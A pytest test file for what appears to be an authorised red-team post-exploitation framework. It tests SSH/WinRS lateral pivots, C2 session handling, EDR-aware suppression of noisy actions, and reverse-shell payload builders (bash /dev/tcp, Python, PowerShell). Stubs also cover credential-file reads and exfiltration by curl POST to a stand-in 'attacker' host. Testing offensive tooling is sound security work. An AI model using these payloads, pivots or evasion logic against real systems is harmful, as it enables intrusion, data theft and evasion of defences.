"""Chain-hardening tests (autonomy gaps 3-6).

3. Real lateral movement with fail-closed pivoted-session registration.
4. EDR detection that actually changes module behaviour (not just logs).
5. The post-exploitation analyzer roadmap wired into chain + report.
6. C2/session layer: waiting, reconnect, routing, reconnecting payloads.
"""

import sys
import time
from pathlib import Path

import pytest

HERE = Path(__file__).parent.parent
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

from modules.engagement import Engagement
from modules.post_exploitation import Platform, PostSession, SessionState
from modules.post_exploitation.data_collection import DataCollector
from modules.post_exploitation.lateral import LateralMovement
from modules.post_exploitation.orchestrator import PostOrchestrator
from modules.post_exploitation.payloads import SHELLS, PayloadFactory
from modules.post_exploitation.persistence import PersistenceInstaller
from modules.post_exploitation.privesc import PrivilegeEscalator
from modules.post_exploitation.session import (
    SessionManager, SSHShellTransport, WinRSCommandTransport,
)
from modules.post_exploitation_analyzer import PostExploitationAnalyzer


SAMPLE_SCAN = {
    "target": "10.0.0.9",
    "vulnerabilities": [
        {"type": "command_injection", "severity": "CRITICAL", "url": "http://t/run"},
        {"type": "sql_injection", "severity": "HIGH"},
        {"type": "xss_reflected", "severity": "MEDIUM"},
        {"type": "file_inclusion", "severity": "HIGH"},
        {"type": "ssrf", "severity": "MEDIUM"},
        {"type": "idor", "severity": "MEDIUM"},
    ],
    "discovery": {"login_forms": [{"url": "http://t/admin"}],
                  "technologies": ["Ubuntu 22.04"]},
    "bruteforce": [{"target": "http://t/login",
                    "username": "admin", "password": "admin"}],
    "exploitation": [],
}


@pytest.fixture()
def engagement() -> Engagement:
    return Engagement(
        name="Chain Test",
        operator="tester",
        in_scope_targets=["10.0.0.0/24"],
        include_subdomains=True,
    )


# ---------------------------------------------------------------------------
# Test doubles
# ---------------------------------------------------------------------------


class ExecTransport:
    """Transport adapter that forwards to a command-response stub."""

    def __init__(self, target):
        self._target = target

    async def execute(self, command, timeout=30):
        return await self._target.exec(command, timeout)

    async def upload(self, local_path, remote_path):
        return True

    async def download(self, remote_path, local_path):
        return True

    async def reconnect(self):
        return getattr(self._target, "reconnect_ok", True)

    async def close(self):
        return True


class FailingTransport(ExecTransport):
    async def execute(self, command, timeout=30):
        raise RuntimeError("session dropped")


class HostTarget:
    """Stub host: canned answers for every phase Athena can run."""

    def __init__(self, host: str = "10.0.0.9", edr: bool = False,
                 pivot_ok: bool = True, reconnect_ok: bool = True):
        self.host = host
        self.edr = edr
        self.pivot_ok = pivot_ok
        self.reconnect_ok = reconnect_ok
        self.calls = []

    async def exec(self, command, timeout=30):
        self.calls.append(command)
        return self.respond(command)

    def respond(self, cmd: str) -> str:
        if self.edr:
            if "falcon-sensor" in cmd or "windefend" in cmd.lower():
                return "RUNNING"
        if cmd.startswith("whoami"):
            return "nt authority\\users"
        if cmd.startswith("id"):
            return "uid=1001(webuser) gid=1001(webuser)"
        if "sudo -l" in cmd or "sudo -n" in cmd:
            return "[!] Not allowed"
        if "cat /etc/shadow" in cmd:
            return "[!] Denied"
        if ".bash_history" in cmd:
            return "echo password1\n"
        if ".aws/credentials" in cmd:
            return "[!] No AWS"
        if "gcloud" in cmd:
            return "[!] No GCP"
        if "arp -a" in cmd or "ip neigh" in cmd:
            return ("10.0.0.20 (10.0.0.20) at 00:11:22:33:44:55\n"
                    "10.0.0.21 (10.0.0.21) at 00:11:22:33:44:56\n"
                    "10.0.0.22 (10.0.0.22) at 00:11:22:33:44:57")
        if "ip route" in cmd or "route -n" in cmd:
            return "10.0.0.0/24 dev eth0 proto kernel\n"
        if "ping -c 1" in cmd:
            return "1 packets transmitted, 1 received\nALIVE"
        if "StrictHostKeyChecking=no" in cmd and "sshpass" in cmd:
            return "ATN_OK" if self.pivot_ok else "[!] Failed"
        if "winrs -r:" in cmd and "net use" in cmd:
            return "ATN_OK" if self.pivot_ok else "[!] Failed"
        if cmd.startswith("base64 "):
            return "bG9vdA==\n"
        if cmd.startswith("find / -perm -4000"):
            return ""
        if "command -v nxc" in cmd:
            return ""
        return ""


# ---------------------------------------------------------------------------
# 3. Transports: argv construction never leaks secrets
# ---------------------------------------------------------------------------


class TestPivotTransports:
    def test_ssh_password_uses_sshpass_env_not_argv(self):
        session = PostSession(target="10.0.0.20")
        transport = SSHShellTransport(session, "10.0.0.20", "root",
                                      password="toor")
        argv = transport._argv("id")
        assert argv[:2] == ["sshpass", "-e"]
        assert "toor" not in argv
        assert "BatchMode" not in " ".join(argv)
        assert argv[-2] == "root@10.0.0.20"
        assert argv[-1] == "id"
        assert transport._env()["SSHPASS"] == "toor"

    def test_ssh_without_password_forces_batchmode(self):
        session = PostSession(target="10.0.0.20")
        transport = SSHShellTransport(session, "10.0.0.20", "root")
        argv = transport._argv("id")
        assert argv[0] == "ssh"
        assert "sshpass" not in argv
        assert "BatchMode=yes" in argv
        assert "SSHPASS" not in transport._env()

    def test_ssh_key_file_adds_identity(self):
        session = PostSession(target="10.0.0.20")
        transport = SSHShellTransport(session, "10.0.0.20", "root",
                                      key_file="/tmp/k")
        argv = transport._argv("id")
        assert "-i" in argv and "/tmp/k" in argv
        assert "IdentitiesOnly=yes" in argv

    def test_winrs_argv_targets_remote_host(self):
        session = PostSession(target="10.0.0.30", platform=Platform.WINDOWS)
        transport = WinRSCommandTransport(session, "10.0.0.30", "adm",
                                          password="P@ss")
        argv = transport._argv("whoami")
        assert argv[0] == "winrs"
        assert "-r:10.0.0.30" in argv
        assert "-u:adm" in argv
        assert "-p:P@ss" in argv
        assert argv[-1] == "whoami"


# ---------------------------------------------------------------------------
# 3. Session registration: fail-closed scope, parent links, waiting
# ---------------------------------------------------------------------------


class TestSessionRegistration:
    def test_register_links_parent_and_scope(self, engagement):
        mgr = SessionManager()
        pivot = PostSession(target="10.0.0.20")
        registered = mgr.register(pivot, engagement=engagement,
                                  execution_context="lateral_pivot",
                                  parent_id="sess-parent")
        assert registered.scope_decision == "allowed"
        assert registered.engagement_id == engagement.id
        assert registered.metadata["parent_session"] == "sess-parent"
        assert mgr.get(pivot.id) is pivot

    def test_register_out_of_scope_denied(self, engagement):
        mgr = SessionManager()
        with pytest.raises(ValueError):
            mgr.register(PostSession(target="172.16.9.9"),
                         engagement=engagement)
        assert mgr.sessions == {}

    def test_register_without_engagement_is_explicit(self):
        mgr = SessionManager()
        session = mgr.register(PostSession(target="172.16.9.9"))
        assert session.scope_decision == "no_engagement"

    @pytest.mark.asyncio
    async def test_wait_for_session_timeout_then_delivery(self, engagement):
        mgr = SessionManager()
        assert await mgr.wait_for_session(timeout=0.05, poll=0.01) is None
        session = mgr.create_for_engagement("10.0.0.9", engagement)
        got = await mgr.wait_for_session(timeout=1.0, poll=0.01)
        assert got is session

    def test_summary_exposes_parent_without_secrets(self, engagement):
        mgr = SessionManager()
        parent = mgr.create_for_engagement("10.0.0.9", engagement)
        mgr.register(PostSession(target="10.0.0.20"),
                     engagement=engagement, parent_id=parent.id)
        rows = mgr.summary()
        assert len(rows) == 2
        child = next(r for r in rows if r["target"] == "10.0.0.20")
        assert child["parent_session"] == parent.id
        assert child["scope_decision"] == "allowed"
        assert "password" not in child


# ---------------------------------------------------------------------------
# 3. Lateral movement: pivots open real, tracked sessions
# ---------------------------------------------------------------------------


class TestLateralPivots:
    @pytest.mark.asyncio
    async def test_ssh_pivot_registers_tracked_session(self, engagement):
        mgr = SessionManager()
        session = PostSession(id="l1", target="10.0.0.9",
                              platform=Platform.LINUX)
        target = HostTarget(host="10.0.0.9")
        session.transport = ExecTransport(target)

        result = await LateralMovement().run(session, {
            "session_mgr": mgr, "engagement": engagement,
            "lateral_timeout": 30, "pivot_host_limit": 20,
        })

        details = result.details
        assert result.success is True
        assert details["pivot_attempts"]
        pivot_id = details["sessions_registered"][0]
        pivot = mgr.get(pivot_id)
        assert pivot is not None
        assert pivot.metadata["parent_session"] == "l1"
        assert pivot.scope_decision == "allowed"
        assert type(pivot.transport).__name__ == "SSHShellTransport"
        assert any(attempt["success"] for attempt in details["pivot_attempts"])

    @pytest.mark.asyncio
    async def test_out_of_scope_pivot_denied_not_registered(self, engagement):
        mgr = SessionManager()
        session = PostSession(id="l1", target="10.0.0.9",
                              platform=Platform.LINUX)
        session.transport = ExecTransport(HostTarget(host="10.0.0.9"))

        outcome = await LateralMovement()._try_credential_on_host(
            session, "172.16.9.9", "root", "toor",
            session_mgr=mgr, engagement=engagement, parent_id="l1")

        assert outcome["success"] is False
        assert outcome["denied"]
        assert outcome["session_id"] == ""
        assert mgr.sessions == {}

    @pytest.mark.asyncio
    async def test_never_pivots_back_into_current_host(self, engagement):
        mgr = SessionManager()
        session = PostSession(id="l1", target="10.0.0.9",
                              platform=Platform.LINUX)
        target = HostTarget(host="10.0.0.9")
        session.transport = ExecTransport(target)

        outcome = await LateralMovement()._try_credential_on_host(
            session, "10.0.0.9", "root", "toor",
            session_mgr=mgr, engagement=engagement, parent_id="l1")

        assert outcome["success"] is False
        assert not any("sshpass" in c for c in target.calls)
        assert mgr.sessions == {}

    @pytest.mark.asyncio
    async def test_windows_probe_registers_winrs_session(self, engagement):
        mgr = SessionManager()
        session = PostSession(id="w1", target="10.0.0.30",
                              platform=Platform.WINDOWS)
        session.transport = ExecTransport(HostTarget(host="10.0.0.30"))

        outcome = await LateralMovement()._try_credential_on_host(
            session, "10.0.0.40", "adm", "P@ss",
            session_mgr=mgr, engagement=engagement, parent_id="w1")

        assert outcome["success"] is True
        pivot = mgr.get(outcome["session_id"])
        assert type(pivot.transport).__name__ == "WinRSCommandTransport"

    @pytest.mark.asyncio
    async def test_pass_the_hash_reports_missing_tooling(self, engagement):
        mgr = SessionManager()
        session = PostSession(id="l1", target="10.0.0.9",
                              platform=Platform.LINUX)
        session.transport = ExecTransport(HostTarget(host="10.0.0.9"))

        out = await LateralMovement()._try_hash_on_host(
            session, ["10.0.0.20"], {"hashes": ["root:$6$abc"]},
            time.time() + 30, session_mgr=mgr, engagement=engagement)

        assert out["status"] == "skipped_tool_missing"
        assert out["tools_searched"]
        assert mgr.sessions == {}


# ---------------------------------------------------------------------------
# 4. EDR: detection changes what modules actually do
# ---------------------------------------------------------------------------


class TestEDRBehaviour:
    @pytest.mark.asyncio
    async def test_linux_chain_suppresses_noisy_actions(self, engagement):
        orch = PostOrchestrator(engagement=engagement)
        orch.configure({
            "only_phases": ["privesc", "persistence"],
            "auto_assess": False,
            "privesc_timeout": 30,
            "persistence_timeout": 30,
        })
        session = orch.session_mgr.create_for_engagement(
            "10.0.0.9", engagement, platform=Platform.LINUX)
        session.transport = ExecTransport(HostTarget(host="10.0.0.9", edr=True))

        results = await orch.run_full_chain(session)

        assert session.edr_detected is True
        assert orch.config["edr_detected"] is True
        policy = orch.generate_report(session.id)["edr_policy"]
        assert policy["edr_detected"] is True
        assert "privesc.kernel_exploit" in policy["suppressed"]

        privesc = results["privesc"]
        assert privesc.details["kernel"]["skipped"] is True
        assert "kernel_exploit" in privesc.details["edr_suppressed"]

        persistence = results["persistence"]
        assert set(persistence.details["edr_suppressed"]) >= {"systemd", "setuid"}

    @pytest.mark.asyncio
    async def test_windows_privesc_suppresses_kernel_and_cred_theft(self):
        session = PostSession(id="w1", target="10.0.0.30",
                              platform=Platform.WINDOWS)
        session.transport = ExecTransport(HostTarget(host="10.0.0.30"))

        result = await PrivilegeEscalator().run(session, {
            "edr_detected": True, "privesc_timeout": 30})

        assert result.details["kernel_win"]["skipped"] is True
        assert result.details["cred_theft"]["skipped"] is True
        assert set(result.details["edr_suppressed"]) == {
            "kernel_exploit", "credential_theft"}

    @pytest.mark.asyncio
    async def test_windows_persistence_suppresses_wmi(self):
        session = PostSession(id="w1", target="10.0.0.30",
                              platform=Platform.WINDOWS)
        session.transport = ExecTransport(HostTarget(host="10.0.0.30"))

        result = await PersistenceInstaller().run(session, {
            "edr_detected": True, "persistence_timeout": 30})

        assert "wmi" in result.details["edr_suppressed"]

    @pytest.mark.asyncio
    async def test_lateral_edr_tightens_hosts_and_blocks_proxy(self, engagement):
        mgr = SessionManager()
        session = PostSession(id="l1", target="10.0.0.9",
                              platform=Platform.LINUX)
        session.transport = ExecTransport(HostTarget(host="10.0.0.9"))

        result = await LateralMovement().run(session, {
            "edr_detected": True, "session_mgr": mgr, "engagement": engagement,
            "lateral_timeout": 30, "pivot_host_limit": 20,
            "edr_pivot_host_limit": 1,
        })

        details = result.details
        assert details["edr_mode"] is True
        assert details["pivot_host_limit"] == 1
        assert details["pivot_scan"]["scanned"] == 1
        assert len(details["pivot_attempts"]) == 1
        assert details["proxy"]["suppressed"] == "edr_detected"
        assert details["proxy"]["deployed"] is False

    @pytest.mark.asyncio
    async def test_no_edr_keeps_proxy_available(self, engagement):
        mgr = SessionManager()
        session = PostSession(id="l1", target="10.0.0.9",
                              platform=Platform.LINUX)
        session.transport = ExecTransport(HostTarget(host="10.0.0.9"))

        result = await LateralMovement().run(session, {
            "session_mgr": mgr, "engagement": engagement,
            "lateral_timeout": 30, "pivot_host_limit": 20,
        })

        details = result.details
        assert details["edr_mode"] is False
        assert details["pivot_scan"]["scanned"] == 3
        assert "suppressed" not in details["proxy"]
        assert len(details["sessions_registered"]) == 3

    @pytest.mark.asyncio
    async def test_exfil_stages_locally_under_edr(self):
        session = PostSession(id="d1", target="10.0.0.9",
                              platform=Platform.LINUX)
        target = HostTarget(host="10.0.0.9")
        session.transport = ExecTransport(target)
        details = {"archive": {"path": "/tmp/loot.tgz"}}

        result = await DataCollector()._exfiltrate(
            session, details,
            {"exfil_url": "http://attacker/upload", "edr_detected": True},
            time.time() + 60)

        assert result["method"] == "staged_local"
        assert result["suppressed"] == "network_exfil_edr"
        assert result["success"] is True
        assert not any("curl -F" in c for c in target.calls)

    @pytest.mark.asyncio
    async def test_exfil_posts_when_no_edr(self):
        session = PostSession(id="d1", target="10.0.0.9",
                              platform=Platform.LINUX)
        target = HostTarget(host="10.0.0.9")
        session.transport = ExecTransport(target)
        details = {"archive": {"path": "/tmp/loot.tgz"}}

        result = await DataCollector()._exfiltrate(
            session, details,
            {"exfil_url": "http://attacker/upload", "edr_detected": False},
            time.time() + 60)

        assert result["method"] == "http_post"
        assert any("curl -F" in c for c in target.calls)

    def test_edr_policy_shape(self):
        orch = PostOrchestrator()
        off = orch._build_edr_policy(False)
        assert off["suppressed"] == []
        on = orch._build_edr_policy(True)
        assert on["edr_detected"] is True
        assert "lateral.proxy_deploy" in on["suppressed"]
        assert on["suppressed_phases"]["privesc"] == [
            "kernel_exploit", "credential_theft"]
        assert on["tightened"]["lateral.pivot_host_limit"] == 3


# ---------------------------------------------------------------------------
# 5. Roadmap: analyzer output is classified and reaches the report
# ---------------------------------------------------------------------------


class TestRoadmap:
    def test_actions_are_classified_and_phases_mapped(self):
        report = PostExploitationAnalyzer().generate_post_exploitation_report(
            SAMPLE_SCAN)
        summary = report["summary"]
        assert summary["phases_applicable"] == 8
        assert summary["actions_total"] == sum(
            len(p["actions"]) for p in report["phases"].values())
        for phase in report["phases"].values():
            assert phase["athena_phases"]
            for action in phase["actions"]:
                assert action["execution"] in ("automated", "tool_required",
                                               "manual")
        by_exec = summary["actions_by_execution"]
        assert by_exec["automated"] >= 1
        assert by_exec["tool_required"] >= 1
        assert by_exec["manual"] >= 1

    def test_empty_scan_results_still_annotate(self):
        report = PostExploitationAnalyzer().generate_post_exploitation_report({})
        assert report["summary"]["phases_total"] == 8
        assert report["summary"]["phases_applicable"] == 0
        assert report["summary"]["actions_total"] == 0

    @pytest.mark.asyncio
    async def test_roadmap_and_sessions_reach_report(self, engagement):
        orch = PostOrchestrator(engagement=engagement)
        orch.configure({
            "scan_results": SAMPLE_SCAN,
            "only_phases": ["foothold"],
            "auto_assess": False,
        })
        session = orch.session_mgr.create_for_engagement(
            "10.0.0.9", engagement, platform=Platform.LINUX)
        session.transport = ExecTransport(HostTarget(host="10.0.0.9"))

        await orch.run_full_chain(session)

        report = orch.generate_report(session.id)
        assert report["roadmap"]["summary"]["phases_applicable"] == 8
        assert report["sessions_total"] == 1
        assert report["sessions"][0]["id"] == session.id
        assert report["edr_policy"]["edr_detected"] is False
        assert orch.config["max_pivot_depth"] == 1
        assert orch.config["pivot_phases"]


# ---------------------------------------------------------------------------
# 6. C2/session layer: routing, reconnect, waiting, payloads
# ---------------------------------------------------------------------------


class TestC2SessionLayer:
    @pytest.mark.asyncio
    async def test_route_command_across_sessions(self, engagement):
        orch = PostOrchestrator(engagement=engagement)
        good = orch.session_mgr.create_for_engagement("10.0.0.9", engagement)
        good.transport = ExecTransport(HostTarget())
        bad = orch.session_mgr.create_for_engagement("10.0.0.10", engagement)
        bad.transport = FailingTransport(HostTarget())

        out = await orch.route_command("id")
        assert out[good.id] == "uid=1001(webuser) gid=1001(webuser)"
        assert out[bad.id].startswith("[!]")

        scoped = await orch.route_command("id", session_ids=[good.id, "missing"])
        assert set(scoped) == {good.id}
        assert await orch.route_command("id", session_ids=["nope"]) == {}

    @pytest.mark.asyncio
    async def test_reconnect_session_state_transitions(self, engagement):
        orch = PostOrchestrator(engagement=engagement)
        ok = orch.session_mgr.create_for_engagement("10.0.0.9", engagement)
        ok.transport = ExecTransport(HostTarget())
        ok.state = SessionState.STALE
        assert await orch.reconnect_session(ok.id) is True
        assert ok.state == SessionState.ACTIVE

        bad = orch.session_mgr.create_for_engagement("10.0.0.10", engagement)
        bad.transport = ExecTransport(HostTarget(reconnect_ok=False))
        assert await orch.reconnect_session(bad.id) is False
        assert bad.state == SessionState.STALE

        bare = orch.session_mgr.create_for_engagement("10.0.0.11", engagement)
        assert await orch.reconnect_session(bare.id) is False
        assert await orch.reconnect_session("nope") is False

    @pytest.mark.asyncio
    async def test_orchestrator_wait_uses_configured_timeout(self, engagement):
        orch = PostOrchestrator(engagement=engagement)
        orch.configure({"listener_wait": 0.05})
        assert await orch.wait_for_session() is None
        session = orch.session_mgr.create_for_engagement(
            "10.0.0.9", engagement)
        assert await orch.wait_for_session() is session


class TestPayloads:
    def test_bash_payload_retries_with_backoff(self):
        payload = PayloadFactory.build("bash", "10.0.0.5", 4444,
                                       retries=7, interval=2)
        assert "/dev/tcp/10.0.0.5/4444" in payload
        assert "seq 1 7" in payload
        assert "sleep 2" in payload

    def test_python_payload_reconnects(self):
        payload = PayloadFactory.build("python", "10.0.0.5", 5555,
                                       retries=5, interval=1)
        assert "socket" in payload
        assert "range(5)" in payload
        assert "time.sleep(1)" in payload

    def test_powershell_payload_reconnects(self):
        payload = PayloadFactory.build("powershell", "10.0.0.5", 4444,
                                       retries=6, interval=3)
        assert "TCPClient('10.0.0.5',4444)" in payload
        assert "Start-Sleep -Seconds 3" in payload

    def test_retries_are_clamped_not_unbounded(self):
        payload = PayloadFactory.build("bash", "10.0.0.5", 4444, retries=0,
                                       interval=0)
        assert "seq 1 1" in payload
        huge = PayloadFactory.build("bash", "10.0.0.5", 4444, retries=10 ** 6)
        assert "seq 1 600" in huge

    def test_unreachable_bind_addresses_rejected(self):
        with pytest.raises(ValueError):
            PayloadFactory.build("bash", "0.0.0.0", 4444)
        with pytest.raises(ValueError):
            PayloadFactory.build("bash", "", 4444)

    def test_unknown_shell_rejected(self):
        with pytest.raises(ValueError):
            PayloadFactory.build("zsh", "10.0.0.5", 4444)

    def test_manifest_covers_every_shell(self):
        manifest = PayloadFactory.manifest("10.0.0.5", 4444, retries=3,
                                           interval=1)
        assert set(manifest) == set(SHELLS)
        assert all(manifest[shell] for shell in SHELLS)
